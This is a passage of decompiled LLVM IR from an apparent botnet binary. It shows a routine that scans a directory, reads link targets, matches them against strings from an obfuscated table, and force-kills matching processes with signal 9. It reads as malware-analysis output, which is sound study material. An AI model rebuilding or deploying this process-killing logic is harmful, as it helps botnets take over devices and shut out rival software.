  %v1_804d961 = add i32 %v0_804d95e, 4139
  store i32 %v1_804d961, i32* %eax.global-to-local, align 4
  store i32 %v1_804d961, i32* %v1_804d95e, align 4
  %v2_804d969 = call i32 @util_strlen(i8* null)
  store i32 %v2_804d969, i32* %eax.global-to-local, align 4
  %v0_804d96e = load i32, i32* @esp, align 4
  %v1_804d96e = inttoptr i32 %v0_804d96e to i32*
  %v3_804d96e = add i32 %v0_804d96e, 4
  %v1_804d96f = inttoptr i32 %v3_804d96e to i32*
  %v0_804d970 = load i32, i32* @ebx, align 4
  store i32 %v0_804d970, i32* %v1_804d96f, align 4
  %v1_804d971 = add i32 %v0_804d96e, 4139
  %v2_804d978 = add i32 %v1_804d971, %v2_804d969
  store i32 %v2_804d978, i32* @eax, align 4
  store i32 %v2_804d978, i32* %v1_804d96e, align 4
  %v3_804d97b = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d980 = load i32, i32* @esp, align 4
  %v1_804d983 = add i32 %v0_804d980, 8
  %v2_804d983 = inttoptr i32 %v1_804d983 to i32*
  store i32 4096, i32* %v2_804d983, align 4
  %v1_804d988 = add i32 %v0_804d980, 43
  store i32 %v1_804d988, i32* %eax.global-to-local, align 4
  %v2_804d98c = add i32 %v0_804d980, 4
  %v3_804d98c = inttoptr i32 %v2_804d98c to i32*
  store i32 %v1_804d988, i32* %v3_804d98c, align 4
  %v1_804d98d = add i32 %v0_804d980, 4139
  %v3_804d994 = inttoptr i32 %v0_804d980 to i32*
  store i32 %v1_804d98d, i32* %v3_804d994, align 4
  %v1_804d995 = call i32 @readlink(i32 0)
  %v0_804d99a = load i32, i32* @esp, align 4
  %v1_804d99a = add i32 %v0_804d99a, 16
  %v1_804d99d = add i32 %v1_804d995, 1
  %v8_804d99d = icmp eq i32 %v1_804d99d, 0
  store i32 %v1_804d99d, i32* %eax.global-to-local, align 4
  br i1 %v8_804d99d, label %dec_label_pc_804d8e5, label %dec_label_pc_804d9a4

dec_label_pc_804d9a4:                             ; preds = %dec_label_pc_804d915
  %v2_804d9a4 = add i32 %v0_804d99a, 12
  %v3_804d9a4 = inttoptr i32 %v2_804d9a4 to i32*
  store i32 %v1_804d99d, i32* %v3_804d9a4, align 4
  %v0_804d9a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d9a5 = add i32 %v0_804d99a, 8
  %v3_804d9a5 = inttoptr i32 %v2_804d9a5 to i32*
  store i32 %v0_804d9a5, i32* %v3_804d9a5, align 4
  %v1_804d9a6 = add i32 %v0_804d99a, 4
  %v2_804d9a6 = inttoptr i32 %v1_804d9a6 to i32*
  store i32 0, i32* %v2_804d9a6, align 4
  %v2_804d9a8 = inttoptr i32 %v0_804d99a to i32*
  store i32 6, i32* %v2_804d9a8, align 4
  %v3_804d9aa = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804d9aa, i32* %eax.global-to-local, align 4
  %v0_804d9af = load i32, i32* @esp, align 4
  %v1_804d9af = inttoptr i32 %v0_804d9af to i32*
  %v3_804d9af = add i32 %v0_804d9af, 4
  %v1_804d9b0 = inttoptr i32 %v3_804d9af to i32*
  store i32 %v3_804d9aa, i32* %v1_804d9b0, align 4
  %v1_804d9b2 = add i32 %v0_804d9af, 4139
  store i32 %v1_804d9b2, i32* @eax, align 4
  store i32 %v1_804d9b2, i32* %v1_804d9af, align 4
  %v3_804d9ba = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d9ba, i32* %eax.global-to-local, align 4
  %v0_804d9bf = load i32, i32* @esp, align 4
  %v1_804d9bf = inttoptr i32 %v0_804d9bf to i32*
  %v2_804d9bf = load i32, i32* %v1_804d9bf, align 4
  store i32 %v2_804d9bf, i32* @ebx, align 4
  %v1_804d9c0 = add i32 %v0_804d9bf, 4139
  store i32 %v1_804d9c0, i32* %v1_804d9bf, align 4
  %v2_804d9c8 = call i32 @util_strlen(i8* null)
  store i32 %v2_804d9c8, i32* %eax.global-to-local, align 4
  %v0_804d9cd = load i32, i32* @esp, align 4
  %v1_804d9cd = inttoptr i32 %v0_804d9cd to i32*
  %v3_804d9cd = add i32 %v0_804d9cd, 4
  %v1_804d9ce = inttoptr i32 %v3_804d9cd to i32*
  %v0_804d9cf = load i32, i32* @ebp, align 4
  store i32 %v0_804d9cf, i32* %v1_804d9ce, align 4
  %v1_804d9d0 = add i32 %v0_804d9cd, 4139
  %v2_804d9d7 = add i32 %v1_804d9d0, %v2_804d9c8
  store i32 %v2_804d9d7, i32* @eax, align 4
  store i32 %v2_804d9d7, i32* %v1_804d9cd, align 4
  %v3_804d9da = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d9da, i32* %eax.global-to-local, align 4
  %v0_804d9df = load i32, i32* @esp, align 4
  %v1_804d9df = inttoptr i32 %v0_804d9df to i32*
  %v2_804d9df = load i32, i32* %v1_804d9df, align 4
  store i32 %v2_804d9df, i32* @edi, align 4
  %v3_804d9df = add i32 %v0_804d9df, 4
  %v1_804d9e0 = inttoptr i32 %v3_804d9df to i32*
  %v2_804d9e0 = load i32, i32* %v1_804d9e0, align 4
  store i32 %v2_804d9e0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d9e0, align 4
  store i32 8, i32* %v1_804d9df, align 4
  %v3_804d9e5 = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804d9e5, i32* %eax.global-to-local, align 4
  %v0_804d9ea = load i32, i32* @esp, align 4
  %v1_804d9ea = inttoptr i32 %v0_804d9ea to i32*
  %v2_804d9ea = load i32, i32* %v1_804d9ea, align 4
  store i32 %v2_804d9ea, i32* @esi, align 4
  store i32 %v3_804d9e5, i32* @ebx, align 4
  %v1_804d9ed = add i32 %v0_804d9ea, 4139
  store i32 %v1_804d9ed, i32* %eax.global-to-local, align 4
  store i32 %v1_804d9ed, i32* %v1_804d9ea, align 4
  %v2_804d9f5 = call i32 @util_strlen(i8* null)
  store i32 %v2_804d9f5, i32* %eax.global-to-local, align 4
  %v0_804d9fa = load i32, i32* @esp, align 4
  %v1_804d9fa = inttoptr i32 %v0_804d9fa to i32*
  %v3_804d9fa = add i32 %v0_804d9fa, 4
  %v1_804d9fb = inttoptr i32 %v3_804d9fa to i32*
  %v0_804d9fc = load i32, i32* @ebx, align 4
  store i32 %v0_804d9fc, i32* %v1_804d9fb, align 4
  %v1_804d9fd = add i32 %v0_804d9fa, 4139
  %v2_804da04 = add i32 %v1_804d9fd, %v2_804d9f5
  store i32 %v2_804da04, i32* @eax, align 4
  store i32 %v2_804da04, i32* %v1_804d9fa, align 4
  %v3_804da07 = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804da0c = load i32, i32* @esp, align 4
  %v1_804da0c = inttoptr i32 %v0_804da0c to i32*
  %v1_804da0d = add i32 %v0_804da0c, 4139
  store i32 %v1_804da0d, i32* %eax.global-to-local, align 4
  store i32 %v1_804da0d, i32* %v1_804da0c, align 4
  %v2_804da15 = call i32 @__GI_opendir(i8* null)
  store i32 %v2_804da15, i32* %eax.global-to-local, align 4
  %v0_804da1a = load i32, i32* @esp, align 4
  %v1_804da1a = add i32 %v0_804da1a, 16
  store i32 %v2_804da15, i32* @edi, align 4
  %v1_804da1f = icmp eq i32 %v2_804da15, 0
  br i1 %v1_804da1f, label %dec_label_pc_804d8e5, label %dec_label_pc_804da27.preheader

dec_label_pc_804da27.preheader:                   ; preds = %dec_label_pc_804d9a4
  %v3_804da2a81 = inttoptr i32 %v0_804da1a to i32*
  store i32 %v2_804da15, i32* %v3_804da2a81, align 4
  %v0_804da2b82 = call i32 @__GI_readdir()
  store i32 %v0_804da2b82, i32* %eax.global-to-local, align 4
  %v0_804da3083 = load i32, i32* @esp, align 4
  store i32 %v0_804da2b82, i32* @esi, align 4
  %v1_804da3585 = icmp eq i32 %v0_804da2b82, 0
  br i1 %v1_804da3585, label %dec_label_pc_804dca4, label %dec_label_pc_804da3d

dec_label_pc_804da3d:                             ; preds = %dec_label_pc_804da27.preheader, %dec_label_pc_804da27.backedge
  %v0_804da3086 = phi i32 [ %v0_804da30, %dec_label_pc_804da27.backedge ], [ %v0_804da3083, %dec_label_pc_804da27.preheader ]
  %v1_804da3d = add i32 %v0_804da3086, 20
  %v2_804da3d = inttoptr i32 %v1_804da3d to i32*
  %v3_804da3d = load i32, i32* %v2_804da3d, align 4
  store i32 %v3_804da3d, i32* @eax, align 4
  %v1_804da41 = icmp eq i32 %v3_804da3d, 0
  %v1_804da43 = icmp eq i1 %v1_804da41, false
  br i1 %v1_804da43, label %dec_label_pc_804dca4, label %dec_label_pc_804da49

dec_label_pc_804da49:                             ; preds = %dec_label_pc_804da3d
  %v2_804da49 = add i32 %v0_804da3086, 12
  %v3_804da49 = inttoptr i32 %v2_804da49 to i32*
  store i32 %v3_804da3d, i32* %v3_804da49, align 4
  %v2_804da4a = add i32 %v0_804da3086, 8
  %v3_804da4a = inttoptr i32 %v2_804da4a to i32*
  store i32 %v3_804da3d, i32* %v3_804da4a, align 4
  %v1_804da4b = add i32 %v0_804da3086, 4
  %v2_804da4b = inttoptr i32 %v1_804da4b to i32*
  store i32 4096, i32* %v2_804da4b, align 4
  %v1_804da50 = add i32 %v0_804da3086, 43
  %v3_804da54 = inttoptr i32 %v0_804da3086 to i32*
  store i32 %v1_804da50, i32* %v3_804da54, align 4
  %v2_804da55 = call i32 @util_zero(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804da55, i32* %eax.global-to-local, align 4
  %v0_804da5a = load i32, i32* @esp, align 4
  %v1_804da5a = inttoptr i32 %v0_804da5a to i32*
  %v2_804da5a = load i32, i32* %v1_804da5a, align 4
  store i32 %v2_804da5a, i32* @ebx, align 4
  %v3_804da5a = add i32 %v0_804da5a, 4
  %v1_804da5b = inttoptr i32 %v3_804da5a to i32*
  %v2_804da5b = load i32, i32* %v1_804da5b, align 4
  store i32 %v2_804da5b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804da5b, align 4
  store i32 6, i32* %v1_804da5a, align 4
  %v3_804da60 = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804da60, i32* %eax.global-to-local, align 4
  %v0_804da65 = load i32, i32* @esp, align 4
  %v1_804da65 = inttoptr i32 %v0_804da65 to i32*
  %v3_804da65 = add i32 %v0_804da65, 4
  %v1_804da66 = inttoptr i32 %v3_804da65 to i32*
  store i32 %v3_804da60, i32* %v1_804da66, align 4
  %v1_804da68 = add i32 %v0_804da65, 4139
  store i32 %v1_804da68, i32* @eax, align 4
  store i32 %v1_804da68, i32* %v1_804da65, align 4
  %v3_804da70 = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da70, i32* %eax.global-to-local, align 4
  %v0_804da75 = load i32, i32* @esp, align 4
  %v1_804da75 = inttoptr i32 %v0_804da75 to i32*
  %v2_804da75 = load i32, i32* %v1_804da75, align 4
  store i32 %v2_804da75, i32* %eax.global-to-local, align 4
  %v1_804da76 = add i32 %v0_804da75, 4139
  store i32 %v1_804da76, i32* %v1_804da75, align 4
  %v2_804da7e = call i32 @util_strlen(i8* null)
  store i32 %v2_804da7e, i32* %eax.global-to-local, align 4
  %v0_804da83 = load i32, i32* @esp, align 4
  %v1_804da83 = inttoptr i32 %v0_804da83 to i32*
  %v3_804da83 = add i32 %v0_804da83, 4
  %v1_804da84 = inttoptr i32 %v3_804da83 to i32*
  %v2_804da84 = load i32, i32* %v1_804da84, align 4
  store i32 %v2_804da84, i32* @ebx, align 4
  %v0_804da85 = load i32, i32* @ebp, align 4
  store i32 %v0_804da85, i32* %v1_804da84, align 4
  %v1_804da86 = add i32 %v0_804da83, 4139
  %v2_804da8d = add i32 %v1_804da86, %v2_804da7e
  store i32 %v2_804da8d, i32* @eax, align 4
  store i32 %v2_804da8d, i32* %v1_804da83, align 4
  %v3_804da90 = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da90, i32* %eax.global-to-local, align 4
  %v0_804da95 = load i32, i32* @esp, align 4
  %v1_804da95 = inttoptr i32 %v0_804da95 to i32*
  %v2_804da95 = load i32, i32* %v1_804da95, align 4
  store i32 %v2_804da95, i32* %eax.global-to-local, align 4
  %v3_804da95 = add i32 %v0_804da95, 4
  %v1_804da96 = inttoptr i32 %v3_804da95 to i32*
  store i32 0, i32* %v1_804da96, align 4
  store i32 8, i32* %v1_804da95, align 4
  %v3_804da9b = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804da9b, i32* @ebx, align 4
  %v0_804daa2 = load i32, i32* @esp, align 4
  %v1_804daa2 = inttoptr i32 %v0_804daa2 to i32*
  %v1_804daa3 = add i32 %v0_804daa2, 4139
  store i32 %v1_804daa3, i32* %eax.global-to-local, align 4
  store i32 %v1_804daa3, i32* %v1_804daa2, align 4
  %v2_804daab = call i32 @util_strlen(i8* null)
  store i32 %v2_804daab, i32* %eax.global-to-local, align 4
  %v0_804dab0 = load i32, i32* @esp, align 4
  %v1_804dab0 = inttoptr i32 %v0_804dab0 to i32*
  %v3_804dab0 = add i32 %v0_804dab0, 4
  %v1_804dab1 = inttoptr i32 %v3_804dab0 to i32*
  %v0_804dab2 = load i32, i32* @ebx, align 4
  store i32 %v0_804dab2, i32* %v1_804dab1, align 4
  %v1_804dab3 = add i32 %v0_804dab0, 4139
  %v2_804daba = add i32 %v1_804dab3, %v2_804daab
  store i32 %v2_804daba, i32* @eax, align 4
  store i32 %v2_804daba, i32* %v1_804dab0, align 4
  %v3_804dabd = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804dabd, i32* %eax.global-to-local, align 4
  %v0_804dac2 = load i32, i32* @esp, align 4
  %v1_804dac2 = inttoptr i32 %v0_804dac2 to i32*
  %v2_804dac2 = load i32, i32* %v1_804dac2, align 4
  store i32 %v2_804dac2, i32* @ebx, align 4
  %v1_804dac3 = add i32 %v0_804dac2, 4139
  store i32 %v1_804dac3, i32* %eax.global-to-local, align 4
  store i32 %v1_804dac3, i32* %v1_804dac2, align 4
  %v2_804dacb = call i32 @util_strlen(i8* null)
  store i32 %v2_804dacb, i32* %eax.global-to-local, align 4
  %v0_804dad0 = load i32, i32* @esp, align 4
  %v1_804dad0 = inttoptr i32 %v0_804dad0 to i32*
  %v3_804dad0 = add i32 %v0_804dad0, 4
  %v1_804dad1 = inttoptr i32 %v3_804dad0 to i32*
  store i32 ptrtoint (i32* @global_var_805582d.13 to i32), i32* %v1_804dad1, align 4
  %v1_804dad7 = add i32 %v0_804dad0, 4139
  %v2_804dade = add i32 %v1_804dad7, %v2_804dacb
  store i32 %v2_804dade, i32* @eax, align 4
  store i32 %v2_804dade, i32* %v1_804dad0, align 4
  %v3_804dae1 = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804dae1, i32* %eax.global-to-local, align 4
  %v0_804dae6 = load i32, i32* @esp, align 4
  %v1_804dae6 = inttoptr i32 %v0_804dae6 to i32*
  %v2_804dae6 = load i32, i32* %v1_804dae6, align 4
  store i32 %v2_804dae6, i32* @ebx, align 4
  %v1_804dae7 = add i32 %v0_804dae6, 4139
  store i32 %v1_804dae7, i32* %eax.global-to-local, align 4
  store i32 %v1_804dae7, i32* %v1_804dae6, align 4
  %v2_804daef = call i32 @util_strlen(i8* null)
  store i32 %v2_804daef, i32* %eax.global-to-local, align 4
  %v0_804daf4 = load i32, i32* @esp, align 4
  %v1_804daf4 = inttoptr i32 %v0_804daf4 to i32*
  %v3_804daf4 = add i32 %v0_804daf4, 4
  %v0_804daf5 = load i32, i32* @esi, align 4
  %v1_804daf5 = add i32 %v0_804daf5, 11
  %v1_804daf8 = inttoptr i32 %v3_804daf4 to i32*
  store i32 %v1_804daf5, i32* %v1_804daf8, align 4
  %v1_804dafa = add i32 %v0_804daf4, 4139
  %v2_804db01 = add i32 %v1_804dafa, %v2_804daef
  store i32 %v2_804db01, i32* @eax, align 4
  store i32 %v2_804db01, i32* %v1_804daf4, align 4
  %v3_804db04 = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804db09 = load i32, i32* @esp, align 4
  %v1_804db0c = add i32 %v0_804db09, 8
  %v2_804db0c = inttoptr i32 %v1_804db0c to i32*
  store i32 4096, i32* %v2_804db0c, align 4
  %v1_804db11 = add i32 %v0_804db09, 43
  store i32 %v1_804db11, i32* %eax.global-to-local, align 4
  %v2_804db15 = add i32 %v0_804db09, 4
  %v3_804db15 = inttoptr i32 %v2_804db15 to i32*
  store i32 %v1_804db11, i32* %v3_804db15, align 4
  %v1_804db16 = add i32 %v0_804db09, 4139
  %v3_804db1d = inttoptr i32 %v0_804db09 to i32*
  store i32 %v1_804db16, i32* %v3_804db1d, align 4
  %v1_804db1e = call i32 @readlink(i32 0)
  %v0_804db23 = load i32, i32* @esp, align 4
  %v1_804db26 = add i32 %v1_804db1e, 1
  %v8_804db26 = icmp eq i32 %v1_804db26, 0
  store i32 %v1_804db26, i32* %eax.global-to-local, align 4
  br i1 %v8_804db26, label %dec_label_pc_804da27.backedge, label %dec_label_pc_804db2d

dec_label_pc_804db2d:                             ; preds = %dec_label_pc_804da49
  %v1_804db30 = add i32 %v0_804db23, 43
  store i32 %v1_804db30, i32* %eax.global-to-local, align 4
  %v3_804db34 = inttoptr i32 %v0_804db23 to i32*
  store i32 %v1_804db30, i32* %v3_804db34, align 4
  %v2_804db35 = call i32 @util_strlen(i8* null)
  %v0_804db3a = load i32, i32* @esp, align 4
  %v1_804db3d = add i32 %v0_804db3a, 8764
  store i32 %v1_804db3d, i32* @edx, align 4
  %v2_804db44 = add i32 %v0_804db3a, 8
  %v3_804db44 = inttoptr i32 %v2_804db44 to i32*
  store i32 %v1_804db3d, i32* %v3_804db44, align 4
  %v2_804db45 = add i32 %v0_804db3a, 4
  %v3_804db45 = inttoptr i32 %v2_804db45 to i32*
  store i32 %v2_804db35, i32* %v3_804db45, align 4
  %v1_804db46 = add i32 %v0_804db3a, 43
  store i32 %v1_804db46, i32* %eax.global-to-local, align 4
  %v3_804db4a = inttoptr i32 %v0_804db3a to i32*
  store i32 %v1_804db46, i32* %v3_804db4a, align 4
  %v4_804db4b = call i32 @util_stristr(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804db50 = load i32, i32* @esp, align 4
  %v1_804db53 = add i32 %v4_804db4b, 1
  %v8_804db53 = icmp eq i32 %v1_804db53, 0
  store i32 %v1_804db53, i32* @eax, align 4
  br i1 %v8_804db53, label %dec_label_pc_804da27.backedge, label %dec_label_pc_804db5a

dec_label_pc_804db5a:                             ; preds = %dec_label_pc_804db2d
  %v0_804db5a = load i32, i32* @ebx, align 4
  %v2_804db5a = add i32 %v0_804db50, 12
  %v3_804db5a = inttoptr i32 %v2_804db5a to i32*
  store i32 %v0_804db5a, i32* %v3_804db5a, align 4
  %v0_804db5b = load i32, i32* @ebx, align 4
  %v2_804db5b = add i32 %v0_804db50, 8
  %v3_804db5b = inttoptr i32 %v2_804db5b to i32*
  store i32 %v0_804db5b, i32* %v3_804db5b, align 4
  %v1_804db5c = add i32 %v0_804db50, 4
  %v2_804db5c = inttoptr i32 %v1_804db5c to i32*
  store i32 10, i32* %v2_804db5c, align 4
  %v0_804db5e = load i32, i32* @ebp, align 4
  %v3_804db5e = inttoptr i32 %v0_804db50 to i32*
  store i32 %v0_804db5e, i32* %v3_804db5e, align 4
  %v3_804db5f = call i32 @util_atoi(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804db5f, i32* %eax.global-to-local, align 4
  %v0_804db64 = load i32, i32* @esp, align 4
  %v1_804db64 = inttoptr i32 %v0_804db64 to i32*
  %v3_804db64 = add i32 %v0_804db64, 4
  %v1_804db65 = inttoptr i32 %v3_804db64 to i32*
  store i32 9, i32* %v1_804db65, align 4
  store i32 %v3_804db5f, i32* %v1_804db64, align 4
  %v2_804db69 = call i32 @kill(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804db69, i32* %eax.global-to-local, align 4
  %v0_804db6e = load i32, i32* @esp, align 4
  %v1_804db6e = add i32 %v0_804db6e, 20
  %v2_804db6e = inttoptr i32 %v1_804db6e to i32*
  store i32 1, i32* %v2_804db6e, align 4
  %v0_804db76 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804da27.backedge

dec_label_pc_804da27.backedge:                    ; preds = %dec_label_pc_804db5a, %dec_label_pc_804da49, %dec_label_pc_804db2d
  %v0_804da2742.in = phi i32 [ %v0_804db76, %dec_label_pc_804db5a ], [ %v0_804db23, %dec_label_pc_804da49 ], [ %v0_804db50, %dec_label_pc_804db2d ]
  %v0_804da2a.pre = load i32, i32* @edi, align 4
  %v3_804da2a = inttoptr i32 %v0_804da2742.in to i32*
  store i32 %v0_804da2a.pre, i32* %v3_804da2a, align 4
  %v0_804da2b = call i32 @__GI_readdir()
  store i32 %v0_804da2b, i32* %eax.global-to-local, align 4
  %v0_804da30 = load i32, i32* @esp, align 4
  store i32 %v0_804da2b, i32* @esi, align 4
  %v1_804da35 = icmp eq i32 %v0_804da2b, 0
  br i1 %v1_804da35, label %dec_label_pc_804dca4, label %dec_label_pc_804da3d

dec_label_pc_804db7e:                             ; preds = %dec_label_pc_804d828
  %v1_804db7e = add i32 %v0_804db7e, 1
  store i32 %v1_804db7e, i32* @esi, align 4
  %v9_804db7f = icmp eq i32 %v0_804db7e, 0
  %v1_804db82 = icmp eq i1 %v9_804db7f, false
  br i1 %v1_804db82, label %dec_label_pc_804d830, label %dec_label_pc_804db88

dec_label_pc_804db88:                             ; preds = %dec_label_pc_804db7e
  %v1_804db88 = add i32 %v0_804d832, 3
  %v2_804db88 = inttoptr i32 %v1_804db88 to i8*
  %v3_804db88 = load i8, i8* %v2_804db88, align 1
  %v12_804db88 = icmp eq i8 %v3_804db88, 65
  %.stack_var_-8769.1 = select i1 %v12_804db88, i8 1, i8 %stack_var_-8769.1.ph
  %v1_804db8e = add i32 %v0_804d832, 1
  br label %dec_label_pc_804d810.outer

dec_label_pc_804db96:                             ; preds = %dec_label_pc_804d7b6, %dec_label_pc_804d7a4
  store i32 %v1_804d7a4, i32* @esi, align 4
  br label %dec_label_pc_804d7d0

dec_label_pc_804dba0:                             ; preds = %dec_label_pc_804d7c3
  %v4_804d7c3 = zext i8 %v3_804d7c3 to i32
  %v6_804d7c3 = and i32 %v5_804d7c3, -256
  %v7_804d7c3 = or i32 %v4_804d7c3, %v6_804d7c3
  %v7_804dba0 = icmp eq i8 %v3_804d7c3, 32
  %v1_804dba3 = icmp eq i1 %v7_804dba0, false
  br i1 %v1_804dba3, label %dec_label_pc_804d7c3, label %dec_label_pc_804d7d0

dec_label_pc_804dbb0:                             ; preds = %dec_label_pc_804d820, %dec_label_pc_804d818
  %v1_804dbb0 = and i32 %v0_804dbb0, -256
  %v2_804dbb0 = or i32 %v1_804dbb0, 1
  br label %dec_label_pc_804d832

dec_label_pc_804dbb7:                             ; preds = %dec_label_pc_804d857
  %v4_804d857 = zext i8 %v3_804d857 to i32
  %v6_804d857 = and i32 %v5_804d857, -256
  %v7_804d857 = or i32 %v4_804d857, %v6_804d857
  %v7_804dbb7 = icmp eq i8 %v3_804d857, 32
  %v1_804dbba = icmp eq i1 %v7_804dbb7, false
  br i1 %v1_804dbba, label %dec_label_pc_804d857, label %dec_label_pc_804d864

dec_label_pc_804dbc5:                             ; preds = %dec_label_pc_804d897
  store i32 0, i32* @ebx, align 4
  store i32 6, i32* %stack_var_-8796, align 4
  %v2_804dbcc = call i32 @table_lock_val(i8 6)
  store i32 %v2_804dbcc, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8796, align 4
  %v2_804dbd8 = call i32 @table_lock_val(i8 7)
  store i32 %v2_804dbd8, i32* %eax.global-to-local, align 4
  store i32 8, i32* %stack_var_-8796, align 4
  %v2_804dbe4 = call i32 @table_lock_val(i8 8)
  store i32 %v2_804dbe4, i32* %eax.global-to-local, align 4
  store i32 9, i32* %stack_var_-8796, align 4
  %v2_804dbf0 = call i32 @table_lock_val(i8 9)
  store i32 %v2_804dbf0, i32* %eax.global-to-local, align 4
  %v2_804dc00.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804dbf8

dec_label_pc_804dbf8:                             ; preds = %dec_label_pc_804d714, %dec_label_pc_804dbc5
  %v2_804dc00 = phi i32 [ %v0_804d663, %dec_label_pc_804d714 ], [ %v2_804dc00.pre, %dec_label_pc_804dbc5 ]
  %v0_804dbfe = load i32, i32* @ebx, align 4
  store i32 %v0_804dbfe, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc00, i32* @ebx, align 4
  store i32 %v0_804d662, i32* @esi, align 4
  store i32 %v0_804d661, i32* @edi, align 4
  store i32 %v0_804d660, i32* @ebp, align 4
  ret i32 %v0_804dbfe

dec_label_pc_804dc0c:                             ; preds = %dec_label_pc_804d8ff, %dec_label_pc_804d8e5
  %v2_804dc0f = inttoptr i32 %v1_804d8f2 to i32*
  %v3_804dc0f = load i32, i32* %v2_804dc0f, align 4
  %v3_804dc13 = inttoptr i32 %v0_804d8f2 to i32*
  store i32 %v3_804dc0f, i32* %v3_804dc13, align 4
  %v1_804dc14 = sext i8 %stack_var_-8769.2 to i32
  %v2_804dc14 = inttoptr i32 %v1_804dc14 to i32*
  %v3_804dc14 = call i32 @__GI_closedir(i32* %v2_804dc14)
  store i32 %v3_804dc14, i32* %eax.global-to-local, align 4
  %v0_804dc19 = load i32, i32* @esp, align 4
  %v1_804dc19 = add i32 %v0_804dc19, 20
  %v2_804dc19 = inttoptr i32 %v1_804dc19 to i8*
  %v3_804dc19 = load i8, i8* %v2_804dc19, align 1
  %v4_804dc19 = sext i8 %v3_804dc19 to i32
  store i32 %v4_804dc19, i32* @ebx, align 4
  %v1_804dc1e = add i32 %v0_804dc19, 16
  br label %dec_label_pc_804dc21

dec_label_pc_804dc21:                             ; preds = %dec_label_pc_804d8b9.dec_label_pc_804dc21_crit_edge, %dec_label_pc_804dc0c
  %v1_804dc26.pre-phi = phi i32 [ %.pre47, %dec_label_pc_804d8b9.dec_label_pc_804dc21_crit_edge ], [ %v1_804dc14, %dec_label_pc_804dc0c ]
  %v0_804dc21 = phi i32 [ %v15_804d664, %dec_label_pc_804d8b9.dec_label_pc_804dc21_crit_edge ], [ %v1_804dc1e, %dec_label_pc_804dc0c ]
  %v1_804dc24 = add i32 %v0_804dc21, -16
  %v2_804dc24 = inttoptr i32 %v1_804dc24 to i32*
  store i32 1, i32* %v2_804dc24, align 4
  %v2_804dc26 = call i32 @sleep(i32 %v1_804dc26.pre-phi)
  store i32 %v2_804dc26, i32* %eax.global-to-local, align 4
  %v0_804dc2b = load i32, i32* @esp, align 4
  %v1_804dc2b = inttoptr i32 %v0_804dc2b to i32*
  store i32 6, i32* %v1_804dc2b, align 4
  %v3_804dc32 = call i32 @table_lock_val(i8 %stack_var_-8769.2)
  store i32 %v3_804dc32, i32* %eax.global-to-local, align 4
  %v0_804dc37 = load i32, i32* @esp, align 4
  %v1_804dc37 = inttoptr i32 %v0_804dc37 to i32*
  store i32 7, i32* %v1_804dc37, align 4
  %v3_804dc3e = call i32 @table_lock_val(i8 %stack_var_-8769.2)
  store i32 %v3_804dc3e, i32* %eax.global-to-local, align 4
  %v0_804dc43 = load i32, i32* @esp, align 4
  %v1_804dc43 = inttoptr i32 %v0_804dc43 to i32*
  store i32 8, i32* %v1_804dc43, align 4
  %v3_804dc4a = call i32 @table_lock_val(i8 %stack_var_-8769.2)
  store i32 %v3_804dc4a, i32* %eax.global-to-local, align 4
  %v0_804dc4f = load i32, i32* @esp, align 4
  %v1_804dc4f = inttoptr i32 %v0_804dc4f to i32*
  store i32 9, i32* %v1_804dc4f, align 4
  %v3_804dc56 = call i32 @table_lock_val(i8 %stack_var_-8769.2)
  %v0_804dc5b = load i32, i32* @esp, align 4
  %v0_804dc5e = load i32, i32* @ebx, align 4
  store i32 %v0_804dc5e, i32* %eax.global-to-local, align 4
  %v1_804dc60 = add i32 %v0_804dc5b, 8780
  %v1_804dc66 = inttoptr i32 %v1_804dc60 to i32*
  %v2_804dc66 = load i32, i32* %v1_804dc66, align 4
  store i32 %v2_804dc66, i32* @ebx, align 4
  %v3_804dc66 = add i32 %v0_804dc5b, 8784
  %v1_804dc67 = inttoptr i32 %v3_804dc66 to i32*
  %v2_804dc67 = load i32, i32* %v1_804dc67, align 4
  store i32 %v2_804dc67, i32* @esi, align 4
  %v3_804dc67 = add i32 %v0_804dc5b, 8788
  %v1_804dc68 = inttoptr i32 %v3_804dc67 to i32*
  %v2_804dc68 = load i32, i32* %v1_804dc68, align 4
  store i32 %v2_804dc68, i32* @edi, align 4
  %v3_804dc68 = add i32 %v0_804dc5b, 8792
  %v1_804dc69 = inttoptr i32 %v3_804dc68 to i32*
  %v2_804dc69 = load i32, i32* %v1_804dc69, align 4
  store i32 %v2_804dc69, i32* @ebp, align 4
  ret i32 %v0_804dc5e

dec_label_pc_804dc6b:                             ; preds = %entry
  %v3_804dc6b = load i8, i8* %stack_var_-48, align 1
  %v4_804dc6b = sext i8 %v3_804dc6b to i32
  %v4_804dc81 = zext i8 %tmp48 to i32
  %v6_804dc81 = and i32 %v4_804dc6b, -256
  %v7_804dc81 = or i32 %v6_804dc81, %v4_804dc81
  store i32 %v7_804dc81, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804d714

